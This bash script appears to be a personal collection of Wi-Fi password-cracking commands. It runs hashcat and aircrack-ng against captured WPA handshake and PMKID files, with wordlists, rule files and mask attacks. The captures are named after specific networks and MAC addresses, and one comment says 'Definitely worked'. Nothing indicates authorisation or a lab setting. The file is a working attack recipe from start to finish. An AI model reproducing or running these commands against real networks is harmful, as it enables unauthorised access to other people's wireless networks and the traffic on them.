#!/bin/bash
scripts_dir=/opt/easy-linux
hashcat -a 0 -m 22000 ${scripts_dir}/support <dictionary_file> -r /usr/share/wordlists/OneRuleToRuleThemAll.rule

hashcat -a 9 -m 2500 /opt/easy-linux/hcxdump_full.pcapng /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -w 3 --deprecated-check-disable

# Definitely worked
hashcat -m 22000 -a 0 hs/pmkid_Beesomebodyisback_BC-EE-7B-7F-23-C0_2023-04-22T21-21-10.22000 /usr/share/dict/wordlist-probable.txt -w 3 --force

hcxpcapngtool -o hs/handshake_DG1670A82_8C-09-F4-05-E8-80_2023-05-30T05-07-51.hccapx hs/handshake_DG1670A82_8C-09-F4-05-E8-80_2023-05-30T05-07-51.cap

hashcat -m 22000 -a 0 hs/handshake_DG1670A82_8C-09-F4-05-E8-80_2023-05-30T05-07-51.cap  /usr/share/dict/wordlist-probable.txt -w 3 --force

#crack with aircrack-ng
aircrack-ng -a 2 -w /usr/share/wordlists/rockyou.txt --bssid A0:39:EE:47:B8:D6 -l /tmp/user/0/wifitef4pzwrss/wpakey.txt hs/handshake_MySpectrumWiFid02G_A0-39-EE-47-B8-D6_2023-06-08T04-25-07.cap


hashcat --stdout -a 3 --increment --increment-min 2 --increment-max 3 ?d?d?d?d

hashcat -m 22000 -a 3 -i /Users/ldawg/crack/Dumps/DumpLogAAA-2.hccapx ?d?d?d?d?d?d?d?d?d?d
hashcat -m 22000 -a 7 -i /opt/easy-linux/support/generated.hccapx /usr/share/wordlists/rockyou.txt ?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?d?d?d --increment --increment-min 13 --increment-max 15 -r /usr/share/wordlists/OneRuleToRuleThemAll.rule

hashcat -m 22000 -a 1 -i /opt/easy-linux/support/generated.hccapx /usr/share/wordlists/rockyou.txt /usr/share/wordlists/OneRuleToRuleThemAll.rule ?l?l?l?l?l?l?l?l?l?l?d?d?d --increment --increment-min 10 --increment-max 10



hashcat -a 6 -m 22000 /opt/easy-linux/support ?l?l?l?l?l?l?l?l?l?l?l?l?d?d?d
hashcat -a 6 -m 22000 /opt/easy-linux/support ?l?l?l?l?l?l?l?l?l?l?l?l?d?d?d --increment --increment-min 13 -r /usr/share/wordlists/OneRuleToRuleThemAll.rule
hashcat -a 6 -m 22000 /opt/easy-linux/support ?l?l?l?l?l?l?l?l?l?l?l?l?d?d?d --increment --increment-min 13 --increment-max 15 -r /usr/share/wordlists/OneRuleToRuleThemAll.rule

hashcat -a 7 -m 22000 /opt/easy-linux/support /usr/share/wordlists/rockyou.txt ?l?l?l?l?l?l?l?l?l?l?l?l?d?d?d --increment --increment-min 13 --increment-max 15 -r /usr/share/wordlists/OneRuleToRuleThemAll.rule

hashcat -a 7 -m 22000 /opt/easy-linux/support /usr/share/wordlists/rockyou.txt ?l?l?l?l?l?l?l?l?l?l?l?l?d?d?d --increment --increment-min 13 --increment-max 15 -r /usr/share/wordlists/OneRuleToRuleThemAll.rule

hashcat -a 7 -m 22000 /opt/easy-linux/support /usr/share/wordlists/rockyou.txt ?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?d?d?d --increment --increment-min 13 --increment-max 15 -r /usr/share/wordlists/OneRuleToRuleThemAll.rule
